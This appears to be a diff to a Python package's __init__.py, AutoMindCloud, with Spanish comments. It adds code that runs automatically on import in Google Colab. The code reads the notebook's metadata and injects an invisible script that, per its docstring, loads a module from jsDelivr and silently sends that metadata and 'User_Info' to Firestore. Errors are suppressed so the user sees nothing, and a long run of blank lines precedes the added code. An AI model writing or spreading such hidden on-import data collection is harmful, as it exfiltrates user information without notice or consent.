@@ -101,76 +101,102 @@ def Download_Zip(Drive_Link, Output_Name="USDModel"):
 
 
 
-# @title 🔥 Envío silencioso de AutoMind_Info a Firestore mediante jsDelivr
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+# AutoMindCloud/__init__.py
 
 import json
 import uuid
-from google.colab import _message
-from IPython.display import HTML, display
+
+__all__ = []
 
 
-# ============================================================
-# 1. LEER AutoMind_Info DESDE metadata DEL NOTEBOOK ACTUAL
-# ============================================================
-try:
-    respuesta = _message.blocking_request(
-        "get_ipynb",
-        timeout_sec=60
-    )
+def _obtener_automind_info():
+    """
+    Lee metadata.AutoMind_Info del notebook actual de Google Colab.
+    Retorna un diccionario seguro.
+    """
+    try:
+        from google.colab import _message
 
-    notebook = respuesta.get("ipynb", {})
+        respuesta = _message.blocking_request(
+            "get_ipynb",
+            timeout_sec=60
+        )
 
-    if isinstance(notebook, str):
-        notebook = json.loads(notebook)
+        notebook = respuesta.get("ipynb", {})
 
-    if not isinstance(notebook, dict):
-        notebook = {}
+        if isinstance(notebook, str):
+            notebook = json.loads(notebook)
 
-    autoMindInfo = (
-        notebook
-        .get("metadata", {})
-        .get("AutoMind_Info")
-    )
+        if not isinstance(notebook, dict):
+            return {
+                "Estado": "Notebook no válido"
+            }
 
-    if not isinstance(autoMindInfo, dict):
-        autoMindInfo = {
-            "Estado": "AutoMind_Info no encontrada"
+        auto_mind_info = (
+            notebook
+            .get("metadata", {})
+            .get("AutoMind_Info")
+        )
+
+        if not isinstance(auto_mind_info, dict):
+            return {
+                "Estado": "AutoMind_Info no encontrada"
+            }
+
+        return auto_mind_info
+
+    except Exception:
+        return {
+            "Estado": "No fue posible leer AutoMind_Info"
         }
 
-except Exception:
-    autoMindInfo = {
-        "Estado": "No fue posible leer AutoMind_Info"
-    }
 
+def _enviar_automind_firestore():
+    """
+    Inserta JavaScript invisible en Colab.
+    El módulo JS recoge User_Info y envía ambos objetos a Firestore.
+    """
+    try:
+        from IPython.display import HTML, display
 
-# ============================================================
-# 2. CONVERTIR AutoMind_Info A JSON SEGURO PARA JAVASCRIPT
-# ============================================================
-automind_json = json.dumps(
-    autoMindInfo,
-    ensure_ascii=False
-)
+        auto_mind_info = _obtener_automind_info()
 
-automind_json = (
-    automind_json
-    .replace("<", "\\u003c")
-    .replace(">", "\\u003e")
-    .replace("&", "\\u0026")
-    .replace("\u2028", "\\u2028")
-    .replace("\u2029", "\\u2029")
-)
+        automind_json = json.dumps(
+            auto_mind_info,
+            ensure_ascii=False
+        )
 
+        # Evita romper el <script> si los metadata contienen caracteres HTML.
+        automind_json = (
+            automind_json
+            .replace("<", "\\u003c")
+            .replace(">", "\\u003e")
+            .replace("&", "\\u0026")
+            .replace("\u2028", "\\u2028")
+            .replace("\u2029", "\\u2029")
+        )
 
-# ============================================================
-# 3. ID ÚNICO DEL CONTENEDOR OCULTO
-# ============================================================
-instance_id = f"automind_sender_{uuid.uuid4().hex}"
+        instance_id = f"automind_silent_{uuid.uuid4().hex}"
 
-
-# ============================================================
-# 4. CARGAR LIBRERÍA DESDE jsDelivr Y ENVIAR SILENCIOSAMENTE
-# ============================================================
-html = r'''
+        html = r'''
 <div id="__INSTANCE_ID__" style="display:none;"></div>
 
 <script>
@@ -187,17 +213,26 @@ html = r'''
     await enviarAutoMindFirestore(autoMindInfo);
 
   } catch {
-    // Envío completamente silencioso.
+    // Envío silencioso.
   }
 })();
 </script>
 '''
 
-html = (
-    html
-    .replace("__INSTANCE_ID__", instance_id)
-    .replace("__AUTOMIND_INFO_JSON__", automind_json)
-)
+        html = (
+            html
+            .replace("__INSTANCE_ID__", instance_id)
+            .replace("__AUTOMIND_INFO_JSON__", automind_json)
+        )
 
-display(HTML(html))
+        display(HTML(html))
 
+    except Exception:
+        # Fuera de Colab/IPython o ante cualquier error: no muestra nada.
+        pass
+
+
+# ============================================================
+# ACTIVACIÓN AUTOMÁTICA AL IMPORTAR EL PAQUETE
+# ============================================================
+_enviar_automind_firestore()
